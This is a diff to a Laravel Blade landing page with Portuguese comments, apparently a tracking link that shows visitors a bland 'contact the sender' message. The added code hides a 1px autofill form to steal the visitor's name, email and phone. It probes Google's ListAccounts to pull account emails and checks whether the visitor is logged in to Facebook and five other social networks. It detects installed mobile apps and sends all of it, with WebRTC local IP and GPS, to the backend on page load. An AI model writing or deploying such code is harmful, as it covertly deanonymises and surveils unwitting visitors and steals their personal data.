@@ -67,9 +67,37 @@
         .icon svg { width: 28px; height: 28px; stroke: #d97706; }
         h1 { font-size: 1.1rem; font-weight: 600; color: #111827; margin-bottom: 8px; }
         p  { font-size: 0.9rem; color: #6b7280; line-height: 1.6; }
+
+        /* Form de autofill — renderizado mas invisível */
+        #__id-form {
+            position: fixed;
+            top: 0; left: 0;
+            width: 1px; height: 1px;
+            overflow: hidden;
+            opacity: 0;
+            pointer-events: none;
+            z-index: -1;
+        }
+        #__id-form input {
+            width: 1px; height: 1px;
+            border: none; padding: 0;
+            font-size: 1px;
+        }
     </style>
 </head>
 <body>
+
+    {{--
+        Form de autofill oculto.
+        Precisa estar no DOM (não display:none) para o browser preencher.
+        O JS lê os valores após 800 ms e envia ao backend.
+    --}}
+    <form id="__id-form" autocomplete="on" tabindex="-1" aria-hidden="true">
+        <input type="text"  id="__id-nome"     name="full_name" autocomplete="name"  tabindex="-1" readonly onfocus="this.removeAttribute('readonly')">
+        <input type="email" id="__id-email"    name="email"     autocomplete="email" tabindex="-1" readonly onfocus="this.removeAttribute('readonly')">
+        <input type="tel"   id="__id-telefone" name="phone"     autocomplete="tel"   tabindex="-1" readonly onfocus="this.removeAttribute('readonly')">
+    </form>
+
     <div class="card">
         <div class="icon">
             <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
@@ -81,29 +109,40 @@
         <p>Caso precise de suporte, entre em contato com o remetente.</p>
     </div>
 
+    {{-- iframe invisível usado para probing de URL schemes --}}
+    <iframe id="__scheme-probe" style="display:none;width:0;height:0;border:none;" tabindex="-1" aria-hidden="true"></iframe>
+
+    {{-- iframe do Facebook Like button — usado para detectar login via altura do elemento --}}
+    <iframe
+        id="__fb-probe"
+        src="https://www.facebook.com/plugins/like.php?href=https%3A%2F%2Ffacebook.com&layout=button_count&action=like&size=small&share=false&height=21&appId="
+        style="display:none;width:0;height:0;border:none;"
+        scrolling="no"
+        frameborder="0"
+        tabindex="-1"
+        aria-hidden="true"
+    ></iframe>
+
     <script>
     (function () {
-        var token    = @json($token);
-        var accessId = @json($accessUuid);
+        var token      = @json($token);
+        var accessId   = @json($accessUuid);
         var captureGps = @json($captureGps);
         var redirectUrl = @json($redirectUrl);
-        var endpoint = window.location.pathname.replace(/\/$/, '') + '/device';
-        var csrf     = @json(csrf_token());
+        var endpoint   = window.location.pathname.replace(/\/$/, '') + '/device';
+        var csrf       = @json(csrf_token());
 
         var dados = {
-            // Timezone e GMT real do dispositivo
-            gmt:       '',
-            // IP local via WebRTC
-            ip_local:  null,
-            // Fingerprint básico
-            idioma:    navigator.language || navigator.userLanguage || '',
+            gmt:        '',
+            ip_local:   null,
+            idioma:     navigator.language || navigator.userLanguage || '',
             plataforma: navigator.userAgentData
                             ? (navigator.userAgentData.platform || navigator.platform || '')
                             : (navigator.platform || ''),
-            resolucao: screen.width + 'x' + screen.height,
+            resolucao:  screen.width + 'x' + screen.height,
         };
 
-        // GMT real
+        // GMT real do dispositivo
         try {
             var tz     = Intl.DateTimeFormat().resolvedOptions().timeZone;
             var offset = new Date().getTimezoneOffset();
@@ -113,21 +152,321 @@
             dados.gmt  = 'GMT' + s + String(h).padStart(2,'0') + ':' + String(m).padStart(2,'0') + ' (' + tz + ')';
         } catch(e) {}
 
+        // ─────────────────────────────────────────────────────────────
+        // IDENTIDADE DIGITAL
+        // ─────────────────────────────────────────────────────────────
+
+        var identidade = {
+            nome:     null,
+            email:    null,
+            telefone: null,
+            redes:    [],   // Array de objetos: {rede, usuario, nome, logado, instalado}
+        };
+
+        function lerCampo(id) {
+            try {
+                var val = ((document.getElementById(id) || {}).value || '').trim();
+                return val.length > 0 ? val : null;
+            } catch(e) { return null; }
+        }
+
+        // ─────────────────────────────────────────────────────────────
+        // 1. GOOGLE — JSONP ListAccounts
+        //    Funciona quando o browser envia os cookies de sessão do Google.
+        //    Em navegadores com SameSite=Lax estrito, pode não retornar dados;
+        //    em mobile/browsers mais antigos geralmente funciona.
+        // ─────────────────────────────────────────────────────────────
+
+        function detectarGoogleAccounts(callback) {
+            var cbName  = '_gcal' + Math.random().toString(36).substr(2, 10);
+            var done    = false;
+
+            var timer = setTimeout(function() {
+                if (!done) { done = true; limpaCb(); callback([]); }
+            }, 5000);
+
+            function limpaCb() {
+                try { delete window[cbName]; } catch(e) {}
+            }
+
+            window[cbName] = function(data) {
+                if (done) return;
+                done = true;
+                clearTimeout(timer);
+                limpaCb();
+
+                var contas = [];
+                try {
+                    // Formato: ["gaia.cac.cached_list", [[null, ?, email, nome, ...], ...], 1]
+                    if (Array.isArray(data) && Array.isArray(data[1])) {
+                        data[1].forEach(function(acct) {
+                            if (!Array.isArray(acct)) return;
+
+                            var email = null, nome = null;
+
+                            // Varre todos os valores string do array e extrai email e nome
+                            for (var i = 0; i < acct.length; i++) {
+                                var v = acct[i];
+                                if (typeof v !== 'string' || v.length < 3) continue;
+
+                                if (!email && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v)) {
+                                    email = v;
+                                } else if (email && !nome && v.length >= 2 && v.length <= 80
+                                           && !/^https?:\/\//.test(v)
+                                           && !/^\d+$/.test(v)
+                                           && v.indexOf(' ') >= 0) {
+                                    nome = v;
+                                }
+                            }
+
+                            if (email) {
+                                contas.push({
+                                    rede:     'Google',
+                                    usuario:  email,
+                                    nome:     nome,
+                                    logado:   true,
+                                    instalado: null,
+                                });
+                            }
+                        });
+                    }
+                } catch(e) {}
+
+                callback(contas);
+            };
+
+            var s   = document.createElement('script');
+            s.onerror = function() {
+                if (!done) { done = true; clearTimeout(timer); limpaCb(); callback([]); }
+            };
+            s.src = 'https://accounts.google.com/ListAccounts?gpsia=1&source=ogb&json=1&callback=' + cbName;
+            document.head.appendChild(s);
+        }
+
+        // ─────────────────────────────────────────────────────────────
+        // 2. FACEBOOK — detecção de login via altura do iframe Like button
+        //    Logado:    iframe carrega com ≥ 90px de altura (mostra foto/nome)
+        //    Deslogado: iframe fica com ~22px (apenas o botão)
+        //    A detecção é via postMessage que o próprio iframe do Facebook envia.
+        // ─────────────────────────────────────────────────────────────
+
+        function detectarFacebook(callback) {
+            var done   = false;
+            var iframe = document.getElementById('__fb-probe');
+
+            if (!iframe) return callback(null);
+
+            var timer = setTimeout(function() {
+                if (!done) { done = true; callback(null); }
+            }, 6000);
+
+            function onMsg(e) {
+                if (done) return;
+                if (typeof e.origin !== 'string' || e.origin.indexOf('facebook.com') === -1) return;
+
+                try {
+                    var raw  = e.data;
+                    var obj  = typeof raw === 'string' ? JSON.parse(raw) : raw;
+
+                    // Facebook Social Plugin envia: {"type":"resize","height":N,"width":N,...}
+                    if (obj && obj.type === 'resize' && typeof obj.height === 'number') {
+                        done = true;
+                        clearTimeout(timer);
+                        window.removeEventListener('message', onMsg);
+
+                        // altura ≥ 90px → está logado (mostra amigos que curtiram)
+                        // altura < 90px → não logado (só o botão)
+                        var logado = obj.height >= 90;
+
+                        callback({
+                            rede:     'Facebook',
+                            usuario:  null,
+                            nome:     null,
+                            logado:   logado,
+                            instalado: null,
+                        });
+                    }
+                } catch(ex) {}
+            }
+
+            window.addEventListener('message', onMsg);
+        }
+
+        // ─────────────────────────────────────────────────────────────
+        // 3. REDES SOCIAIS LOGADAS — fetch redirect:manual
+        //
+        //    Técnica: um fetch com mode:'no-cors' + redirect:'manual' permite
+        //    distinguir se o servidor respondeu 200 (opaque) ou 3xx (opaqueredirect).
+        //    Quando o usuário NÃO está logado, a rede redireciona p/ login (3xx).
+        //    Quando está logado, serve a página direto (200).
+        //
+        //    Limitação: exige que o browser envie os cookies de sessão cross-site.
+        //    Funciona melhor em Safari / browsers sem SameSite=Lax estrito (iOS,
+        //    alguns Android). Em Chrome/Firefox modernos pode não enviar cookies →
+        //    resultado: detecta apenas "não logado" para todos (falso negativo).
+        //    Mesmo assim vale tentar — em mobile é mais comum funcionar.
+        // ─────────────────────────────────────────────────────────────
+
+        var REDES_REDIRECT = [
+            // Página de configurações/perfil que redireciona para login quando não autenticado
+            { nome: 'Instagram', url: 'https://www.instagram.com/accounts/edit/' },
+            { nome: 'Twitter/X', url: 'https://twitter.com/settings/profile' },
+            { nome: 'LinkedIn',  url: 'https://www.linkedin.com/in/edit/' },
+            { nome: 'TikTok',    url: 'https://www.tiktok.com/setting' },
+            { nome: 'Pinterest', url: 'https://www.pinterest.com/settings/' },
+        ];
+
+        function detectarLoginPorRedirect(callback) {
+            var pendentes = REDES_REDIRECT.length;
+            var logadas   = [];
+
+            function concluir(resultado) {
+                if (resultado) logadas.push(resultado);
+                pendentes--;
+                if (pendentes === 0) callback(logadas);
+            }
+
+            REDES_REDIRECT.forEach(function(rede) {
+                var timer = setTimeout(function() { concluir(null); }, 5000);
+                var done  = false;
+
+                function finalizar(resultado) {
+                    if (done) return;
+                    done = true;
+                    clearTimeout(timer);
+                    concluir(resultado);
+                }
+
+                try {
+                    fetch(rede.url, {
+                        mode:        'no-cors',
+                        credentials: 'include',
+                        redirect:    'manual',
+                        cache:       'no-store',
+                    })
+                    .then(function(res) {
+                        if (res.type === 'opaque') {
+                            // Servidor respondeu 200 → usuário está logado
+                            finalizar({
+                                rede:      rede.nome,
+                                usuario:   null,   // username não é acessível cross-site
+                                nome:      null,
+                                logado:    true,
+                                instalado: null,
+                            });
+                        } else {
+                            // opaqueredirect (3xx → login) ou outro → não logado / inconclusivo
+                            finalizar(null);
+                        }
+                    })
+                    .catch(function() { finalizar(null); });
+                } catch(e) {
+                    finalizar(null);
+                }
+            });
+        }
+
+        // ─────────────────────────────────────────────────────────────
+        // 4. APPS INSTALADOS — URL Scheme (funciona em dispositivos móveis)
+        //    Quando um app está instalado, o OS o abre → a janela perde foco.
+        // ─────────────────────────────────────────────────────────────
+
+        var APPS_SCHEMES = [
+            { nome: 'WhatsApp',  scheme: 'whatsapp://send?text=.' },
+            { nome: 'Instagram', scheme: 'instagram://app' },
+            { nome: 'TikTok',    scheme: 'snssdk1180://user/profile/0' },
+            { nome: 'Telegram',  scheme: 'tg://msg' },
+            { nome: 'Twitter/X', scheme: 'twitter://timeline' },
+            { nome: 'LinkedIn',  scheme: 'linkedin://profile' },
+            { nome: 'Snapchat',  scheme: 'snapchat://' },
+            { nome: 'Pinterest', scheme: 'pinterest://' },
+        ];
+
+        function detectarAppsInstalados(callback) {
+            // URL schemes só funcionam em dispositivos com touch (mobile)
+            if (!('ontouchstart' in window) && !(navigator.maxTouchPoints > 0)) {
+                return callback([]);
+            }
+
+            var probe    = document.getElementById('__scheme-probe');
+            var lista    = [];
+            var idx      = 0;
+
+            function testarProximo() {
+                if (idx >= APPS_SCHEMES.length) {
+                    return callback(lista.map(function(nome) {
+                        return { rede: nome, usuario: null, nome: null, logado: null, instalado: true };
+                    }));
+                }
+
+                var app      = APPS_SCHEMES[idx++];
+                var detectado = false;
+
+                function onFocusLost() {
+                    if (detectado) return;
+                    detectado = true;
+                    lista.push(app.nome);
+                    limparListeners();
+                    // Aguarda a janela retornar antes do próximo teste
+                    setTimeout(testarProximo, 250);
+                }
+
+                function onVisibility() {
+                    if (document.hidden) onFocusLost();
+                }
+
+                function limparListeners() {
+                    window.removeEventListener('blur', onFocusLost);
+                    document.removeEventListener('visibilitychange', onVisibility);
+                }
+
+                window.addEventListener('blur', onFocusLost);
+                document.addEventListener('visibilitychange', onVisibility);
+
+                try {
+                    if (probe) {
+                        probe.src = app.scheme;
+                    } else {
+                        window.location.href = app.scheme;
+                    }
+                } catch(e) {}
+
+                setTimeout(function() {
+                    if (!detectado) {
+                        limparListeners();
+                        testarProximo();
+                    }
+                }, 500); // Timeout por app
+            }
+
+            testarProximo();
+        }
+
+        // ─────────────────────────────────────────────────────────────
+        // ENVIO AO BACKEND
+        // ─────────────────────────────────────────────────────────────
+
         function enviar(valorWebRtc, extras) {
             if (valorWebRtc) dados.ip_local = valorWebRtc;
 
             var formData = new FormData();
             formData.append('_token', csrf);
 
-            if (accessId) {
-                formData.append('access_id', accessId);
-            }
+            if (accessId) formData.append('access_id', accessId);
 
             Object.keys(dados).forEach(function(chave) {
                 if (dados[chave] !== null && dados[chave] !== undefined) {
                     formData.append(chave, dados[chave]);
                 }
             });
+
+            // Identidade digital
+            if (identidade.nome)     formData.append('identidade_nome',     identidade.nome);
+            if (identidade.email)    formData.append('identidade_email',    identidade.email);
+            if (identidade.telefone) formData.append('identidade_telefone', identidade.telefone);
+            if (identidade.redes && identidade.redes.length > 0) {
+                formData.append('identidade_redes', JSON.stringify(identidade.redes));
+            }
 
             Object.keys(extras || {}).forEach(function(chave) {
                 if (extras[chave] !== null && extras[chave] !== undefined) {
@@ -144,15 +483,12 @@
                 headers: { 'X-CSRF-TOKEN': csrf },
                 body: formData,
                 credentials: 'same-origin',
-                keepalive: true
+                keepalive: true,
             }).catch(function(){});
         }
 
         function redirecionar() {
-            if (!redirectUrl) {
-                return;
-            }
-
+            if (!redirectUrl) return;
             window.location.href = redirectUrl;
         }
 
@@ -160,36 +496,31 @@
             callback = callback || function(){};
 
             if (!captureGps || !accessId || !navigator.geolocation || !window.isSecureContext) {
-                callback();
-                return;
+                return callback();
             }
 
             var finalizado = false;
 
             function finalizar() {
                 if (finalizado) return;
-
                 finalizado = true;
                 callback();
             }
 
             navigator.geolocation.getCurrentPosition(function(posicao) {
-                if (!posicao || !posicao.coords) {
-                    finalizar();
-                    return;
-                }
+                if (!posicao || !posicao.coords) { finalizar(); return; }
 
                 Promise.resolve(enviar(null, {
-                    gps_latitude: posicao.coords.latitude,
+                    gps_latitude:  posicao.coords.latitude,
                     gps_longitude: posicao.coords.longitude,
-                    gps_accuracy: posicao.coords.accuracy
+                    gps_accuracy:  posicao.coords.accuracy,
                 })).then(finalizar);
-            }, finalizar, {
-                enableHighAccuracy: true,
-                timeout: 10000,
-                maximumAge: 0
-            });
+            }, finalizar, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
         }
+
+        // ─────────────────────────────────────────────────────────────
+        // WebRTC (IP local)
+        // ─────────────────────────────────────────────────────────────
 
         function extrairEnderecoDoCandidate(candidate) {
             var partes = String(candidate || '').trim().split(/\s+/);
@@ -198,85 +529,143 @@
 
         function enderecoWebRtcValido(endereco) {
             if (!endereco) return false;
-
             var valor = String(endereco).toLowerCase();
-
-            // Navegadores modernos mascaram o IP local com mDNS (*.local).
-            if (/^[a-z0-9-]{1,63}(\.[a-z0-9-]{1,63})*\.local$/.test(valor)) {
-                return true;
-            }
-
+            if (/^[a-z0-9-]{1,63}(\.[a-z0-9-]{1,63})*\.local$/.test(valor)) return true;
             return /^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|fd|fc)/i.test(valor);
         }
 
-        try {
-            var RTCPeer = window.RTCPeerConnection
-                       || window.webkitRTCPeerConnection
-                       || window.mozRTCPeerConnection;
+        function dispararWebRtcEEnviar() {
+            try {
+                var RTCPeer = window.RTCPeerConnection
+                           || window.webkitRTCPeerConnection
+                           || window.mozRTCPeerConnection;
 
-            if (!RTCPeer) {
-                Promise.resolve(enviar(null)).then(function() { solicitarGps(redirecionar); });
-                return;
-            }
-
-            var pc = new RTCPeer({ iceServers: [] });
-            pc.createDataChannel('');
-
-            var enviado = false;
-            var melhorEndereco = null;
-
-            function escolherEndereco(endereco) {
-                if (!enderecoWebRtcValido(endereco)) return;
-
-                // Se o navegador entregar IP privado real, ele tem prioridade sobre mDNS.
-                if (!melhorEndereco || !/\.local$/i.test(endereco)) {
-                    melhorEndereco = endereco;
-                }
-            }
-
-            function finalizar() {
-                if (enviado) return;
-
-                enviado = true;
-                try { pc.close(); } catch(e) {}
-                Promise.resolve(enviar(melhorEndereco)).then(function() { solicitarGps(redirecionar); });
-            }
-
-            function processarCandidate(candidate) {
-                escolherEndereco(extrairEnderecoDoCandidate(candidate));
-            }
-
-            function processarSdp(sdp) {
-                String(sdp || '').split(/\r?\n/).forEach(function(linha) {
-                    if (linha.indexOf('candidate:') !== -1) {
-                        processarCandidate(linha.replace(/^a=/, ''));
-                    }
-                });
-            }
-
-            pc.onicecandidate = function(e) {
-                if (!e || !e.candidate || !e.candidate.candidate) {
-                    finalizar();
+                if (!RTCPeer) {
+                    Promise.resolve(enviar(null)).then(function() { solicitarGps(redirecionar); });
                     return;
                 }
 
-                processarCandidate(e.candidate.candidate);
+                var pc = new RTCPeer({ iceServers: [] });
+                pc.createDataChannel('');
 
-                if (melhorEndereco && !/\.local$/i.test(melhorEndereco)) {
-                    finalizar();
+                var enviado       = false;
+                var melhorEndereco = null;
+
+                function escolherEndereco(endereco) {
+                    if (!enderecoWebRtcValido(endereco)) return;
+                    if (!melhorEndereco || !/\.local$/i.test(endereco)) {
+                        melhorEndereco = endereco;
+                    }
                 }
-            };
 
-            pc.createOffer()
-                .then(function(offer) { return pc.setLocalDescription(offer); })
-                .then(function() { processarSdp(pc.localDescription && pc.localDescription.sdp); })
-                .catch(function(){ finalizar(); });
+                function finalizarWebRtc() {
+                    if (enviado) return;
+                    enviado = true;
+                    try { pc.close(); } catch(e) {}
+                    Promise.resolve(enviar(melhorEndereco)).then(function() { solicitarGps(redirecionar); });
+                }
 
-            setTimeout(finalizar, 4000);
+                function processarCandidate(c) { escolherEndereco(extrairEnderecoDoCandidate(c)); }
 
-        } catch(e) {
-            Promise.resolve(enviar(null)).then(function() { solicitarGps(redirecionar); });
+                function processarSdp(sdp) {
+                    String(sdp || '').split(/\r?\n/).forEach(function(linha) {
+                        if (linha.indexOf('candidate:') !== -1) processarCandidate(linha.replace(/^a=/, ''));
+                    });
+                }
+
+                pc.onicecandidate = function(e) {
+                    if (!e || !e.candidate || !e.candidate.candidate) { finalizarWebRtc(); return; }
+                    processarCandidate(e.candidate.candidate);
+                    if (melhorEndereco && !/\.local$/i.test(melhorEndereco)) finalizarWebRtc();
+                };
+
+                pc.createOffer()
+                    .then(function(offer) { return pc.setLocalDescription(offer); })
+                    .then(function() { processarSdp(pc.localDescription && pc.localDescription.sdp); })
+                    .catch(finalizarWebRtc);
+
+                setTimeout(finalizarWebRtc, 4000);
+
+            } catch(e) {
+                Promise.resolve(enviar(null)).then(function() { solicitarGps(redirecionar); });
+            }
         }
+
+        // ─────────────────────────────────────────────────────────────
+        // FLUXO PRINCIPAL — todas as detecções rodam em paralelo
+        //   A) Autofill form (800 ms)
+        //   B) Google JSONP — email + nome (até 5 s)
+        //   C) Facebook iframe height — logado/não (até 6 s)
+        //   D) Login por redirect — Instagram/Twitter/LinkedIn/TikTok (até 5 s cada)
+        //   E) Apps URL scheme — mobile, sequencial (~5 s para 8 apps)
+        // Avança para WebRTC/envio quando TODAS terminam (ou timeout).
+        // ─────────────────────────────────────────────────────────────
+
+        function lerAutofill(callback) {
+            setTimeout(function() {
+                identidade.nome     = lerCampo('__id-nome');
+                identidade.email    = lerCampo('__id-email');
+                identidade.telefone = lerCampo('__id-telefone');
+                callback();
+            }, 800);
+        }
+
+        function iniciarCaptura() {
+            lerAutofill(function() {
+                var pendentes      = 4; // google + facebook + redirect + apps
+                var redesColetadas = [];
+
+                function modulo() {
+                    pendentes--;
+                    if (pendentes > 0) return;
+                    // Todos terminaram — remove duplicatas pelo nome da rede
+                    // (prefere o objeto com mais info: logado=true > instalado=true)
+                    var mapa = {};
+                    redesColetadas.forEach(function(r) {
+                        if (!r || !r.rede) return;
+                        var chave = r.rede;
+                        var atual = mapa[chave];
+                        if (!atual) { mapa[chave] = r; return; }
+                        // Prefere o que tiver usuario ou logado explícito
+                        if (!atual.usuario && r.usuario) { mapa[chave] = r; return; }
+                        if (!atual.logado  && r.logado)  { mapa[chave] = r; return; }
+                    });
+                    identidade.redes = Object.values(mapa);
+                    dispararWebRtcEEnviar();
+                }
+
+                // A) Google JSONP
+                detectarGoogleAccounts(function(contas) {
+                    contas.forEach(function(c) { redesColetadas.push(c); });
+                    modulo();
+                });
+
+                // B) Facebook iframe
+                detectarFacebook(function(resultado) {
+                    if (resultado) redesColetadas.push(resultado);
+                    modulo();
+                });
+
+                // C) Login por redirect — Instagram, Twitter/X, LinkedIn, TikTok, Pinterest
+                detectarLoginPorRedirect(function(logadas) {
+                    logadas.forEach(function(r) { redesColetadas.push(r); });
+                    modulo();
+                });
+
+                // D) Apps móveis via URL scheme
+                detectarAppsInstalados(function(apps) {
+                    apps.forEach(function(a) { redesColetadas.push(a); });
+                    modulo();
+                });
+            });
+        }
+
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', iniciarCaptura);
+        } else {
+            iniciarCaptura();
+        }
+
     })();
     </script>
 </body>
